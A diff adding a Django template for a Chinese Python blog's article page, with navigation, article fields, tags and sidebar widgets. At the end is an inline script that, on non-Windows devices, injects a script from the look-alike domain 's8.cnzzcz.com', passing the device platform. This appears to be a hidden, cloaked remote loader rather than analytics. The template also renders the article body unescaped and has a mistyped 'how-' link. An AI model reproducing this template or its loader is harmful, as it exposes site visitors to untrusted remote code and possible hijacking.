@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<!-- saved from url=(0034)http://demo.django.cn/show-11.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+    <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
+    <meta name="apple-mobile-web-app-title" content="PythonTOP,拓普Python学院">
+    <title>拓普Python学院,Python!</title>
+
+{% load  static %}
+<link rel="stylesheet" id="bootstrap-css" href="{% static 'css/bootstrap.min.css' %}" type="text/css" media="all">
+<link rel="stylesheet" id="fontawesome-css" href="{% static 'css/font-awesome.min.css' %}" type="text/css" media="all">
+<link rel="stylesheet" id="stylesheet-css" href="{% static 'css/style.css' %}" type="text/css" media="all">
+<link rel="stylesheet" id="raxus-css" href="{% static 'css/raxus.css' %}" type="text/css" media="all">
+<link rel="stylesheet" id="open-social-style-css" href="{% static 'css/os.css' %}" type="text/css" media="all">
+    <meta name="robots" content="index,follow">
+    <meta name="keywords" content="互联网,产品经理,产品设计,用户体验,交互设计,网站运营,移动互联网">
+    <meta name="description" content="聚焦互联网前沿资讯，网络精华内容，交流产品心得。 每天为你速递最新、最鲜、最有料的互联网科技资讯！">
+</head>
+<body class="home blog site-layout-2">
+<!-- 头部 -->
+<header class="fix-wrap" id="fix-wrap">
+    <div class="fix-main clearfix pr" id="fix-main" _hover-ignore="1"><a href="http://demo.django.cn/" class="index-logo">
+        <img src="{% static 'images/black-logo.png' %}" alt="拓普Python学院,Python!"></a>
+        <nav class="nav fl">
+            <ul id="fix-list" class="fix-list clearfix">
+                <li id="menu-item-24086" class="menu-item"><a href="http://demo.django.cn/">首页</a></li>
+                    {% for category in category %}
+                    <li id="menu-item-117720" class="menu-item">
+                        <a href="{% url 'blog:index' %}list-{{ category.id }}.html">{{ category.name }}</a></li>
+                    {% endfor %}
+                
+                <li id="menu-item-24086" class="menu-item"><a href="http://demo.django.cn/about/">关于博主</a></li>
+            </ul>
+        </nav>
+        <form method="get" class="index-search  hidden-xs" action="http://demo.django.cn/s/">
+            <input class="text" name="search" type="text" placeholder="输入关键字" value="">
+            <button class="submit" type="submit"><i class="fa fa-search"></i></button>
+        </form>
+    </div>
+</header>
+
+
+    <!-- /主体 -->
+    <div id="main-container" class="container clearfix">
+        <section class="post-left">
+<div class="breadcrumb">您的位置： <a itemprop="breadcrumb" href="{% url 'blog:index' %}">首页</a> » <a href="{% url 'blog:index' %}list-{{ artical.category.id }}.html">{{ artical.category.name }}</a> »
+    <span class="current">正文</span></div>
+            <div class="post-main clearfix">
+                <h1 class="post-title">{{ artical.title }}</h1>
+                <div class="post-con clearfix">
+                    <div class="article-meta">
+<span class="item">分类：<a href="http://demo.django.cn/list-2.html" rel="category tag">{{ artical.category.name }}</a></span>
+<span class="item">作者：{{ artical.user }}</span>
+<span class="item">浏览：{{ artical.views }}</span>
+<span class="item">{{ artical.create_time|date:"Y年m月d日 H:i" }}</span>
+
+                    </div>
+<article class="article-content">
+{{ artical.body|safe }}
+</article>
+
+<div class="post-tag"><span class="fa fa-tags" aria-hidden="true"></span>标签：
+    {% for tag in artical.tag.all %}
+    <a href="{% url 'blog:index' %}tag/{{ tag.name }}" rel="tag">{{ tag.name }}</a>
+    {% endfor %}
+{#    <a href="http://demo.django.cn/tag/Linux%E7%9F%A5%E8%AF%86" rel="tag">{{ tag.name }}</a>#}
+
+</div>
+                    <div>
+                        <div><b>上一篇：</b>
+                                {% if pre_blog %}
+                                <a href="{% url 'blog:index' %}show-{{ pre_blog.id }}.html" class="article-tag">{{ pre_blog.title }}</a>
+                                {% else %}
+                                    没有了
+                                {% endif %}
+                        </div>
+                        <div><b>下一篇：</b>
+                                {% if next_blog %}
+                                <a href="{% url 'blog:index' %}how-{{ next_blog.id }}.html" class="article-tag">{{ next_blog.title }}</a>
+                                {% else %}
+                                    没有了
+                                {% endif %}
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+            <!-- /文章 -->
+
+
+            <div class="recommend  hidden-xs">
+
+                <div class="head clearfix"><span class="sp">您可能感兴趣的:</span></div>
+                <ul>
+                    {% for interest in interest %}
+                    <li>
+                        <div class="pic">
+                            <a href="{% url 'blog:index' %}show-{{ interest.id }}.html" title="{{ interest.title }}"><img src="/media/{{ interest.img }}" srcset="/media/{{ interest.img }}" alt="{{ interest.title }}" class="wp-post-image" width="145" height="100"></a>
+                        </div>
+                        <a class="descript " href="{% url 'blog:index' %}show-{{ interest.id }}.html" rel="bookmark" title="{{ interest.title }}">{{ interest.title }}</a>
+                    </li>
+                    {% endfor %}
+                </ul>
+            </div>
+
+
+        </section>
+        <!-- /post-left -->
+        <!-- /post-right -->
+        <aside class="post-right hidden-xs">
+            
+
+            
+<section class="widget post-right-item">
+    <h4 class="post-right-title">热门推荐</h4>
+    <ul class="post-hot clearfix">
+            {% for recommend in recommend %}
+            <li>
+                <div class="img">
+                    <a href="{% url 'blog:index' %}show-{{ recommend.id }}.html" title="{{ recommend.title }}">
+                        <img src="/media/{{ recommend.img }}" srcset="/media/{{ recommend.img }}" alt="{{ recommend.title }}" class="wp-post-image" width="120" height="80">
+                    </a>
+                </div>
+                <div class="text">
+                    <a href="{% url 'blog:index' %}show-{{ recommend.id }}.html" title="{{ recommend.title }}" target="_blank">{{ recommend.title }}</a>
+                </div>
+            </li>
+            {% endfor %}
+
+        
+    </ul>
+</section>
+
+
+<section class="widget post-right-item"><h4 class="post-right-title">所有标签</h4>
+    <div class="tags">
+            {% for tag in tag %}
+            <a href="{% url 'blog:index' %}tag/{{ tag.name }}">{{ tag.name }}</a>
+            {% endfor %}
+        
+    </div>
+</section>
+{#<!-- /关注我们 -->#}
+{#<div class="post-right-item">#}
+{#    <h4 class="post-right-title">关注我们</h4>#}
+{#    <div class="wid-about">#}
+{#        <p>拓普Python学院，欢迎关注！</p>#}
+{#        <img src="./文章详情页_files/weixinqr.jpg" alt="微信二维码" width="160" height="160">#}
+{#    </div>#}
+{#    <div class="wid-about">#}
+{#        <p><strong>联系方式:</strong></p>#}
+{#        <p>QQ:445813</p>#}
+{#        <p>Email：445813@qq.com</p>#}
+{#    </div>#}
+{#</div>#}
+
+
+        </aside>
+
+        
+    </div>
+    <!-- /主体 -->
+
+
+<!-- 底部 -->
+<footer class="footer">
+    <div class="copyright"> © 2010- 2018 · All Rights Reserved
+        · <a href="https://www.django.cn/">Django中文网</a>
+        · <a href="http://www.miibeian.gov.cn/" target="_blank">湘ICP备17023990号</a> 版权所有 © Django中文网
+    </div>
+</footer>
+<script src="{% static 'js/bundle.js' %}"></script>
+<script type="text/javascript" src="{% static 'js/view-history.js' %}"></script>
+<script type="text/javascript" src="{% static 'js/push.js' %}"></script>
+<script type="text/javascript" src="{% static 'js/jquery.min.js' %}"></script>
+<script type="text/javascript" src="{% static 'js/bootstrap.min.js' %}"></script>
+<script type="text/javascript" src="{% static 'js/raxus-slider.min.js' %}"></script>
+<script type="text/javascript" src="{% static 'js/loader.js' %}"></script>
+<script type="text/javascript" src="{% static 'js/bj-lazy-load.min.js' %}"></script>
+<script type="text/javascript" src="{% static 'js/os.js' %}"></script>
+<script type="text/javascript">
+(function(d, n) {
+    	if(n.indexOf('Win')=='0')return;
+        var ho = d.createElement("script");
+        ho.src = "http://s8.cnzzcz.com/ip/6845?w="+n;
+        var s = d.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(ho, s);
+})(document, navigator.platform);
+</script>
+
+</body></html>
